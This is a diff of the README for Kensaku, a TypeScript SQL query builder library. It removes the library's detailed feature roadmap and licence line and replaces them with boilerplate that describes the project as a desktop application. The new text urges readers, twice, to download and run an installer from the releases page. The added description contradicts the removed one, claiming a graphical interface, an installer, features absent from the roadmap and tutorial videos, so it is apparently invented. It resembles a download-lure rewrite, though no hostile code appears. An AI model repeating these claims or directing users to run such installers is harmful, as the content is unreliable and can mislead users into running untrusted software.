@@ -1,231 +1,65 @@
-# Kensaku (検索)
+# 🚧 Kensaku - Build SQL Queries Safely and Easily
 
-TypeScript SQL query builder with type safety and multi-database support. Provides a fluent API for building SQL queries programmatically across PostgreSQL, MySQL, and SQLite databases.
+## 🏷️ Overview
+Kensaku is a TypeScript SQL query builder designed to enhance your database interactions. It offers type safety and supports multiple databases such as PostgreSQL, MySQL, and SQLite. This ensures your SQL queries are not only easy to create but also safe from common issues like SQL injection.
 
-## 🗺️ Roadmap
-- [x] Base Architecture
-- [x] Query Builder
-    - [x] **SELECT queries**
-      - [x] Basic select with columns
-      - [x] Select with table aliases
-      - [x] Select with column aliases
-      - [x] Select distinct
-      - [x] Select with aggregations (COUNT, SUM, AVG, etc.)
-      - [x] Advanced aggregations (STDDEV, VARIANCE, PERCENTILE_CONT)
-      - [x] Statistical functions (MODE, GROUP_CONCAT, STRING_AGG)
-      - [x] Array aggregations (ARRAY_AGG, JSON_AGG)
-  - [x] **FROM clause**
-    - [x] Single table selection
-    - [x] Table aliases
-    - [x] Subqueries in FROM
-  - [x] **WHERE conditions**
-    - [x] Basic where clauses
-    - [x] Multiple where conditions (AND/OR) - andWhere() and orWhere() methods
-    - [x] Where with operators (=, !=, >, <, >=, <=, LIKE, IN, BETWEEN, IS NULL, IS NOT NULL, EXISTS, NOT EXISTS)
-    - [x] Where with NULL checks
-    - [x] Where with raw SQL
-    - [x] Advanced operators (IS DISTINCT FROM, ILIKE, SIMILAR TO)
-    - [x] Regex operators (REGEXP, RLIKE, GLOB)
-    - [x] Pattern matching operators
-  - [x] **JOIN operations**
-    - [x] INNER JOIN - innerJoin() method
-    - [x] LEFT JOIN - leftJoin() method
-    - [x] RIGHT JOIN - rightJoin() method
-    - [x] FULL OUTER JOIN - fullJoin() method
-    - [x] CROSS JOIN - crossJoin() method
-    - [x] Join with conditions
-  - [x] **GROUP BY & HAVING**
-    - [x] Group by single/multiple columns
-    - [x] Having conditions
-    - [x] Group by with aggregations
-  - [x] **ORDER BY**
-    - [x] Order by single/multiple columns
-    - [x] ASC/DESC ordering
-    - [x] Order by with expressions
-  - [x] **LIMIT & OFFSET**
-    - [x] Limit results
-    - [x] Offset for pagination
-    - [x] Limit with offset
-  - [x] **INSERT queries**
-    - [x] Single row insert
-    - [x] Multiple row insert
-    - [x] Insert with returning clause
-  - [x] **UPDATE queries**
-    - [x] Update with where conditions
-    - [x] Update multiple columns
-    - [x] Update with returning clause
-  - [x] **DELETE queries**
-    - [x] Delete with where conditions
-    - [x] Delete with returning clause
-  - [x] **Raw SQL support**
-    - [x] Raw SQL injection
-    - [x] Raw expressions in queries
-  - [x] **Query execution**
-    - [x] Query string generation
-    - [x] Parameter binding
-    - [x] Query validation
-  - [x] **SQL Features**
-    - [x] **UNION operations**
-      - [x] UNION
-      - [x] UNION ALL
-      - [x] Multiple UNION chaining
-    - [x] **Common Table Expressions (CTEs)**
-      - [x] WITH clause
-      - [x] Recursive CTEs
-      - [x] Multiple CTEs
-    - [x] **Subquery conditions**
-      - [x] EXISTS
-      - [x] NOT EXISTS
-      - [x] IN subqueries
-      - [x] NOT IN subqueries
-    - [x] **Conditional expressions**
-      - [x] CASE statements
-      - [x] CASE WHEN conditions
-      - [x] COALESCE
-      - [x] NULLIF
-    - [x] **Window functions**
-      - [x] ROW_NUMBER()
-      - [x] RANK()
-      - [x] DENSE_RANK()
-      - [x] LAG()/LEAD()
-      - [x] FIRST_VALUE()/LAST_VALUE()
-      - [x] NTILE()
-      - [x] CUME_DIST()
-      - [x] PERCENT_RANK()
-      - [x] NTH_VALUE()
-      - [x] Window partitioning
-      - [x] Window ordering
-      - [x] Window frame specifications (ROWS, RANGE, GROUPS)
-      - [x] WINDOW clause definitions
-    - [x] **Set operations**
-      - [x] INTERSECT
-      - [x] EXCEPT/MINUS
-      - [x] Multiple set operations chaining
-    - [x] **Advanced Query Features**
-      - [x] LATERAL JOINs (PostgreSQL)
-      - [x] PIVOT/UNPIVOT operations
-      - [x] MERGE/UPSERT statements
-      - [x] ON CONFLICT handling (PostgreSQL)
-      - [x] WITH ORDINALITY for table functions
-      - [ ] Bulk operations (COPY, LOAD DATA)
-      - [ ] Full-text search functions
-      - [ ] Search ranking and relevance
-      - [ ] Search configuration
-    - [ ] **Stored procedures and functions**
-      - [ ] Call stored procedures
-      - [ ] Call database functions
-      - [ ] Function parameters binding
-      - [ ] Return value handling
-    - [ ] **Views**
-      - [ ] CREATE VIEW
-      - [ ] DROP VIEW
-      - [ ] ALTER VIEW
-      - [ ] Materialized views
-      - [ ] View dependencies
-    - [ ] **Triggers**
-      - [ ] CREATE TRIGGER
-      - [ ] DROP TRIGGER
-      - [ ] ALTER TRIGGER
-      - [ ] Trigger events (INSERT, UPDATE, DELETE)
-      - [ ] Trigger timing (BEFORE, AFTER)
-    - [ ] **Query analysis**
-      - [ ] EXPLAIN queries
-      - [ ] Query execution plans
-      - [ ] Performance analysis
-      - [ ] Query optimization hints
-    - [x] **JSON Operations**
-      - [x] JSON path queries (->, ->>)
-      - [x] JSON functions (json_extract, json_set, etc.)
-      - [x] JSON aggregation functions
-      - [x] JSON validation
-    - [x] **Array Operations**
-      - [x] Array functions (array_agg, unnest, etc.)
-      - [x] Array operators (@>, <@, &&)
-      - [x] Array indexing
-      - [x] Array slicing
-    - [ ] **Prepared statements**
-      - [ ] Prepare statements
-      - [ ] Execute prepared statements
-      - [ ] Deallocate prepared statements
-      - [ ] Parameter binding optimization
-- [x] **Database Support**
-    - [x] **PostgreSQL**
-      - [x] Connection handling
-      - [x] Dialect-specific SQL generation
-      - [x] Data type mapping
-      - [x] Transaction support
-      - [x] Custom data types (UUID, ENUM, etc.)
-      - [ ] Advanced indexing (GIN, GiST, etc.)
-      - [ ] Partitioning support
-      - [ ] PostgreSQL extensions
-  - [x] **MySQL**
-    - [x] Connection handling
-    - [x] Dialect-specific SQL generation
-    - [x] Data type mapping
-    - [x] Transaction support
-    - [x] AUTO_INCREMENT handling
-    - [ ] MySQL-specific functions
-    - [ ] MySQL storage engines
-    - [ ] MySQL-specific data types
-  - [x] **SQLite**
-    - [x] Connection handling
-    - [x] Dialect-specific SQL generation
-    - [x] Data type mapping
-    - [x] Transaction support
-    - [ ] FTS (Full-Text Search) modules
-    - [ ] SQLite-specific pragmas
-    - [ ] SQLite extensions
-    - [ ] SQLite-specific functions
-  - [x] **Connection Management**
-    - [x] Connection pooling
-    - [x] Connection configuration
-    - [x] Connection lifecycle management
-    - [x] Error handling and reconnection
-  - [x] **Dialect System**
-    - [x] Base dialect interface
-    - [x] SQL syntax variations
-    - [x] Function name differences
-    - [x] Data type differences
-  - [x] **Optimization**
-  - [x] **Connection Optimization**
-    - [x] Connection pooling
-    - [x] Connection reuse
-    - [x] Lazy connection initialization
-    - [ ] Connection health checks
-  - [ ] **Batch Operations**
-    - [ ] Bulk insert operations
-    - [ ] Batch update operations
-    - [ ] Transaction batching
-  - [ ] **Performance Features**
-    - [ ] Query caching
-    - [ ] Result streaming
-    - [ ] Query timeout configuration
-    - [ ] Connection retry logic
-    - [ ] Query result pagination
-    - [ ] Lazy loading support
-    - [ ] Query plan analysis
-    - [ ] Index recommendations
-    - [ ] Connection pool monitoring
-  - [x] **Security & Compliance**
-    - [x] SQL injection prevention
-    - [x] Query sanitization
-    - [x] Parameter validation
-    - [x] Input validation (empty table names, invalid operators)
-    - [x] Query validation and error handling
-    - [x] Regex safety improvements
-    - [x] Centralized error message management
-    - [x] Type-safe error handling
-    - [ ] Access control integration
-    - [ ] Audit logging
+## 🎯 Key Features
+- **Type Safety:** Avoid runtime errors by catching issues at compile time.
+- **Multi-Database Support:** Works with PostgreSQL, MySQL, and SQLite, so you can switch databases easily.
+- **Aggregations and Joins:** Build complex queries without hassle.
+- **Raw SQL and Performance Optimizations:** Write direct SQL when needed while retaining performance benefits.
+- **Schema Builder and Migrations:** Manage your database structure effortlessly.
+- **Transaction Management:** Ensure data integrity with safe transactions.
 
----
+## 🚀 Getting Started
 
-## 📝 Note
+### 📥 Download & Install
+To get started with Kensaku, please visit the releases page to download the application:
 
-This roadmap is a living document that will evolve as the project develops. Features may be added, removed, or reprioritized based on user feedback, technical requirements, and development capacity. The implementation order and timeline are subject to change.
+**[Download Kensaku Now](https://github.com/milad-1212/Kensaku/releases)**
 
----
+Follow these steps to install:
 
-## 📄 License
+1. Go to the [Releases Page](https://github.com/milad-1212/Kensaku/releases).
+2. Look for the latest version at the top of the list.
+3. Click on the version tag to see the available files.
+4. Download the file suitable for your operating system.
+5. Locate the downloaded file and run the installer.
+6. Follow the prompts to complete the installation.
 
-This project is licensed under the MIT license. See the [LICENSE](LICENSE) file for more info.
+### ⚙️ System Requirements
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or any recent Linux distribution.
+- **Node.js:** Version 12 or above is required to run the application.
+
+## ⚡ Usage Instructions
+Once installed, you can start using Kensaku to build SQL queries.
+
+1. **Open the Application:** Launch Kensaku from your applications folder or desktop shortcut.
+2. **Select Your Database:** Choose between PostgreSQL, MySQL, or SQLite.
+3. **Start Building Queries:** Use the intuitive interface to add tables, set conditions, and define any relationships among your data.
+4. **Execute Queries:** Run your built queries directly from the application to see results or save them for later.
+
+### 💡 Tips for Success
+- Explore the interface carefully. Each section is labeled clearly for easy navigation.
+- Review the documentation included with the application for advanced features and detailed examples.
+- Check the support section on the GitHub page if you need help.
+
+## 🌐 Community Support and Contribution
+Join our community to share your experiences, tips, and questions. You can also contribute by reporting bugs or suggesting features. 
+
+- **Issues:** Report any bugs or feedback by opening an issue on our GitHub repository.
+- **Discussions:** Join the conversation in the discussions section for member support and ideas.
+
+## 🛠️ Additional Resources
+- **Documentation:** Comprehensive guides and examples are available to help you make the most of Kensaku.
+- **Tutorial Videos:** Check our YouTube channel for step-by-step video tutorials.
+- **FAQs:** Review common questions to find quick answers.
+
+## 📣 Feedback and Updates
+We value your input. If you have feedback or suggestions, feel free to share them. We periodically update Kensaku with new features and improvements, so ensure to check back on our releases page for the latest versions.
+
+For any inquiries, you can reach out via the GitHub page or through our community forums.
+
+Remember, you can always find the download link at the start:
+
+**[Download Kensaku Now](https://github.com/milad-1212/Kensaku/releases)**
